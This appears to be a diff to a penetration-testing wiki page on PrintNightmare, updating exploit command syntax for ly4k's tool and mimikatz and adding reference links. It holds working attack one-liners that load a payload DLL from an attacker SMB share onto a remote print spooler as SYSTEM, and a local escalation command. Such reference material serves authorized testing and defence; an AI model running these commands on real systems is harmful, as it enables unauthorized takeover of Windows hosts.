@@ -16,9 +16,8 @@ keywords:
 ## Remote code execution
 
 ```bash
-# cube0x0's PrintNightmare exploit: load a DLL from a share onto the remote spooler as SYSTEM
-printnightmare.py 'example.local/user:password'@<target> '\\<attacker>\share\evil.dll'
-# the DLL is served from an attacker SMB share the target can reach
+# ly4k's PrintNightmare: load a DLL (served from a reachable SMB share) onto the remote spooler as SYSTEM
+printnightmare.py -dll '\\<attacker>\share\evil.dll' 'example.local/user:password@<target>'
 ```
 
 The payload DLL is placed on a reachable share; the spooler copies and executes it, giving code execution as SYSTEM on the target.
@@ -28,8 +27,8 @@ The payload DLL is placed on a reachable share; the spooler copies and executes 
 On a host where you already run as a low-privileged user, the same driver-loading path (and later spooler bugs such as SpoolFool, which plants a directory the spooler loads from) escalates to **SYSTEM** locally:
 
 ```text
-# mimikatz drops the payload and triggers local driver load
-misc::printnightmare
+# mimikatz exploits only when given a payload library; without /library it just lists drivers
+misc::printnightmare /library:<payload.dll>
 # SpoolFool and similar tools exploit the spooler's file handling for local SYSTEM
 ```
 
@@ -42,7 +41,7 @@ misc::printnightmare
 
 ## Tools
 
-- **cube0x0's PrintNightmare exploit / Invoke-Nightmare**: remote and local driver-loading execution.
+- **PrintNightmare (ly4k)** / cube0x0's exploit / Invoke-Nightmare: remote and local driver-loading execution.
 - **mimikatz** (`misc::printnightmare`): local SYSTEM through the spooler.
 - **SpoolFool**: spooler file-handling local privilege escalation.
 
@@ -50,4 +49,5 @@ misc::printnightmare
 
 - [itm4n: a practical guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
 - [The Hacker Recipes: PrintNightmare](https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare)
+- [PrintNightmare (ly4k)](https://github.com/ly4k/PrintNightmare)
 - [SpoolFool (Oliver Lyak)](https://github.com/ly4k/SpoolFool)
